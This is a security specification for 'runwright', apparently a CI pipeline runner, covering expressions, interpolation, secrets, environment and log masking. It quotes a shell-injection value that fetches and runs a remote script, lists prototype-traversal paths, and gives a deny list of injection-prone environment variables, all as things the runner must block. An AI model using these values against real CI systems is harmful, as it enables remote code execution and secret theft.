# runwright pipeline specification

This document describes the observable behaviour that `runwright` is required to
have. It is normative: the acceptance criteria below describe *what* must hold,
not how a runner is expected to arrange its code.

A pipeline is a YAML file committed to a repository. `runwright` reads it,
evaluates it, and executes each job's steps as child processes. Pipelines are run
for pull requests from external contributors, so every value listed in §3.2 is
attacker-controlled text.

---

## §1 Pipeline file

### §1.1 Location and encoding

The runner reads `pipeline.yml` from the workspace root. The file is decoded as
UTF-8. A byte-order mark at the start of the file is ignored.

### §1.2 Top-level shape

```yaml
name: ci
env:                # optional, mapping of string to string
  FOO: bar
jobs:               # required, mapping of job id to job
  build:
    env:            # optional
      BAR: baz
    steps:          # required, non-empty sequence
      - name: checkout
        run: git fetch --all
```

A top-level `env` mapping applies to every job. A job-level `env` mapping
applies to that job and overrides top-level keys of the same name.

An empty file, a file that is not a mapping, a missing `jobs` mapping, a job
without `steps`, or a step without exactly one of `run` / `uses` is a
configuration error. The runner reports the error and exits non-zero without
executing any step.

### §1.3 Step fields

| Field | Type | Meaning |
| --- | --- | --- |
| `name` | string | Display name. Defaults to the step index. |
| `run` | string | Shell script executed by the runner. Mutually exclusive with `uses`. |
| `uses` | string | Identifier of an action to run, e.g. `local:scripts/build`. Mutually exclusive with `run`. |
| `with` | mapping | Inputs for a `uses` step or environment additions for a `run` step. |
| `env` | mapping | Extra environment variables for this step only. |
| `if` | string | A single expression deciding whether the step runs at all. |

All string fields (`name`, `run`, `uses`, `with` values, `env` values, `if`)
support `${{ ... }}` substitution as described in §4 unless stated otherwise.

### §1.4 Ordering and failure

Steps run sequentially in declaration order. Within a job, a step whose process
exits with a non-zero status stops the job: subsequent steps are skipped and the
job result is `failure`. A step whose `if` expression evaluates to a false value
is skipped; skipping is not a failure. `continue-on-error: true` on a step makes
a non-zero exit non-fatal.

---

## §2 Expression language

### §2.1 Form

An expression appears inside `${{ ... }}`. Outside of that wrapper it has no
meaning. The wrapper may contain surrounding whitespace, which is not part of
the expression.

### §2.2 Grammar

An expression is one of:

- a **literal**: a single-quoted or double-quoted string, a decimal number,
  `true`, `false`, or `null`;
- a **context path**: a dotted sequence of identifiers rooted at one of the
  allowed roots in §3.1, optionally followed by numeric indexes written
  `[0]`;
- a **comparison**: `left OP right` where `OP` is one of `==`, `!=`, `<`, `<=`,
  `>`, `>=` and both sides are expressions;
- a **logical combination**: `left && right`, `left || right`, or `!operand`;
- a **parenthesised** expression.

Anything else is a malformed expression and evaluates to an error. This includes
call syntax (`name(...)`), assignment, member access through optional chaining,
template literals, and any token that is not part of the grammar above.

### §2.3 Semantics

- Equality is strict: `==` and `!=` never coerce between types. Numbers compare
  numerically, strings compare by code unit, booleans compare by value, `null`
  equals only `null`.
- Ordering comparisons (`<`, `<=`, `>`, `>=`) are intended for two numbers or
  two strings. An expression that orders values of different types has no
  defined result and must not be relied upon.
- `&&` and `||` produce a boolean and short-circuit: the right operand is not
  evaluated when the result is already determined.
- A truthiness test accepts `false`, `0`, `""`, `null`, and an absent value as
  false. Every other value is true.
- An expression that cannot be evaluated — an unknown root, a missing path
  segment, a segment applied to a non-collection, a type error in a comparison —
  produces an evaluation error. The runner reports the error and does not treat
  it as a silent `false` when it is used to decide whether a step runs.

### §2.4 No executable content

Expressions are data selection and comparison only. Evaluating any expression
must never execute a function, constructor, getter, or any other code supplied
by the expression text, and must never expose host objects such as `process`,
`require`, globals, or module bindings. Reaching such an object through an
expression is a specification violation even if the expression first passes
through an allowed root.

---

## §3 Contexts

### §3.1 Allowed roots

Only these four identifiers may appear as the first segment of a context path:

| Root | Contents |
| --- | --- |
| `github` | Event and repository facts, see §3.3 |
| `env` | The merged environment visible to the current step (§6) |
| `matrix` | The current job's matrix values; empty when no matrix is configured |
| `needs` | Results of jobs listed in `needs`, keyed by job id |

Every other root is unknown and is an evaluation error. This applies to
`secrets`, `vars`, `inputs`, `runner`, `job`, `steps`, `strategy`, globals such
as `process` and `require`, and any other identifier.

### §3.2 Untrusted origins

The following `github` fields originate in data written by the pull request
author and must be treated as opaque text at all times:

- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.pull_request.head.ref`
- `github.event.pull_request.head.label`
- `github.event.pull_request.head.repo.full_name`
- `github.event.commits[*].message`
- `github.head_ref`
- `github.actor`
- `github.repository` (for forks it reflects the fork's name)

Treating a value as opaque means it is never parsed as syntax, never split into
several values, and never used to choose code to execute.

### §3.3 `github` shape

```yaml
github:
  event_name: pull_request
  sha: 0f1e2d3c...
  ref: refs/pull/42/merge
  repository: acme/widgets
  actor: octocat
  head_ref: feature/login
  event:
    pull_request:
      number: 42
      title: Add login form
      body: ...
      head:
        ref: feature/login
        label: octocat:feature/login
        repo:
          full_name: octocat/widgets
      base:
        ref: main
      merged: false
    commits:
      - message: Fix typo
```

Missing branches evaluate as errors when read (§2.3). The runner never invents
values for fields the event did not provide.

### §3.4 Path resolution

A context path is resolved segment by segment through the context value. Each
segment must name an own, present property of the value being traversed.
Resolution must not consult inherited properties, and must not expose any
object, function, or property that is not part of the declared context data.
The following are therefore evaluation errors, not values:

- `github.event.pull_request.head.repo.__proto__`
- `github.constructor`
- `github.event.constructor.constructor`
- `github.toString`
- `env.hasOwnProperty`
- any path through `prototype` or `__proto__`

An allow-list check on the first segment alone does not satisfy this section.

### §3.5 Indexing

Integer index segments address arrays and are zero-based. A negative, fractional,
or out-of-range index is an error. Indexing a non-array is an error. Object keys
that look like numbers must be reached by name, not by index.

---

## §4 Interpolation

### §4.1 Where

`${{ ... }}` is recognised in `run`, `uses`, `if`, `name`, and in the values of
`env`, `with`, and `jobs.*.env`. A literal `${{` cannot be escaped; a script
that needs to pass those exact characters to a program must build them from
pieces that do not form the marker.

### §4.2 Inside `run`

A `run` script is shell source text. Substitution must preserve that fact:

1. The text of the script outside the `${{ }}` markers stays byte-for-byte
   unchanged.
2. The substituted value becomes exactly one shell word. The value's bytes must
   not be able to terminate the word, start a new command, open a subshell,
   begin a comment, redirect, or otherwise alter the parse of the surrounding
   script.
3. Consequently a value such as `"; curl http://x/s | sh; #` appearing in a
   pull request title must appear in the executed script as a single quoted
   argument. When the shell runs the script, `curl` must not be invoked, and the
   value must reach the program as one argument containing the literal text
   `"; curl http://x/s | sh; #`.
4. Substitution is per occurrence and does not depend on the value's length,
   character set, or the presence of newlines.
5. When the substituted text is a number, boolean, or `null`, it is first
   rendered as text using JSON scalar spelling (`true`, `false`, `null`, and
   decimal numbers). An object or array value is an error in `run`.

### §4.3 Outside `run`

In `if`, `name`, `uses`, and in mapping values, the wrapper denotes an
expression whose value is used as data. There the value is the expression
result converted to text as described in §4.2 item 5. An unclosed `${{` is a
configuration error.

### §4.4 Errors

An expression error in any of a step's fields is a configuration error. The run
is rejected before any step executes and the runner exits with status `2`. The
diagnostic identifies the field that failed (for example
`jobs.build.steps[2].run`) and must not contain a secret value.

---

## §5 Secrets

### §5.1 Storage

Secrets are supplied to the runner out of band (environment variables of the
runner process named `RUNWRIGHT_SECRET_<NAME>`, or an explicit secrets map passed
by the caller). They are not read from `pipeline.yml`. Secret names are
case-insensitive and normalised to upper case.

### §5.2 Where a secret may appear

`secrets.NAME` is permitted only as the whole value of an entry in `env:` or
`with:`, including step-level `env:` and `with:`. It may be combined there with
literal text, e.g. `TOKEN: prefix-${{ secrets.NAME }}`.

Using `secrets.NAME` anywhere else — inside `run:` text, inside `if:`, inside a
`name:`, inside `uses:`, or nested inside any other expression — is a
configuration error for the run. No step executes, the runner exits with status
`2`, and the diagnostic identifies the field but does not print the secret
value.

### §5.3 Values

An unknown secret name is an error at the point of use, not an empty string.
Secret values are never written to `pipeline.yml`, never echoed into a
diagnostic, and never included in the environment under a name taken from
`pipeline.yml` unless that name is declared in `env:` / `with:` by the pipeline
author. In particular the runner may not copy every `RUNWRIGHT_SECRET_*`
variable into a child process.

---

## §6 Environment

### §6.1 Composition

For a `run` step the child environment is composed in this order, later entries
replacing earlier ones:

1. the runner process environment, minus the runner's own bookkeeping
   variables (`RUNWRIGHT_SECRET_*`) and minus the variables named in §6.2;
2. the top-level `env:` mapping, after interpolation;
3. the job `env:` mapping, after interpolation;
4. the step `env:` mapping and, for `run` steps, step `with:` entries, after
   interpolation.

All keys and values are strings. A non-string scalar is converted as in §4.2
item 5.

### §6.2 Reserved variables

A pipeline may not set, override, or remove the following variables for a child
process:

- `NODE_OPTIONS`, `NODE_PATH`, `NODE_EXTRA_CA_CERTS`
- `PATH`, `Path`
- `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES`
- `SHELL`
- `COMSPEC`, `PATHEXT`
- any variable whose name starts with `RUNWRIGHT_`

An entry naming a reserved variable is rejected: the run is a configuration
error and no step executes. Ignoring the entry silently is an acceptable
alternative only if the runner emits a warning that names the key. Either way,
the child process must not receive the pipeline-supplied value.

### §6.3 Secret masking in environment output

Environment printed by the runner or by a step's own output is masked per §7.

---

## §7 Log masking

### §7.1 Scope

Everything the runner writes to its log stream is masked: runner diagnostics,
captured stdout and stderr of steps, and the command lines it prints. Masking is
applied to the whole line before it is emitted.

### §7.2 Rules

- Every secret value known to the runner is replaced by `***` wherever it
  appears in the log, regardless of its length. A one-character secret is
  masked exactly like a fifty-character secret.
- Masking is not conditional on any minimum length, on the secret's character
  class, or on the secret appearing in a field the runner expected.
- If several secrets are known, all are masked. When one secret value is a
  substring of another, the longest match wins so that no suffix of a longer
  secret leaks.
- An empty secret value is never masked (masking the empty string is
  meaningless) and is not usable as an environment value.
- Masked output must not reveal the secret's length. `***` is used for every
  match, whatever its length.
- Masking applies to text that is split across writes only insofar as the
  runner buffers complete lines; the runner must not emit a partial line that
  contains an unmasked secret.

---

## §8 Execution and results

### §8.1 Child processes

`run` scripts execute in a shell: `sh -e -c` where a POSIX shell exists,
otherwise the platform's default command interpreter. The working directory is
the workspace root. The process is killed if it exceeds the job timeout.

### §8.2 Standard streams

stdout and stderr are captured line by line and forwarded to the runner log
after masking. A step's output is never interpreted as configuration.

### §8.3 `uses` steps

`uses: local:<path>` resolves `<path>` relative to the workspace root, refuses
any path that escapes the root (via `..`, an absolute path, or a symlink), and
runs the referenced script as a `run` step. `uses: <anything else>` is a
configuration error.

### §8.4 Exit status

The runner exits `0` when every non-skipped step in every job succeeded, `1`
when any step failed, and `2` for a configuration or evaluation error detected
before steps ran. A job with no runnable steps still reports success.
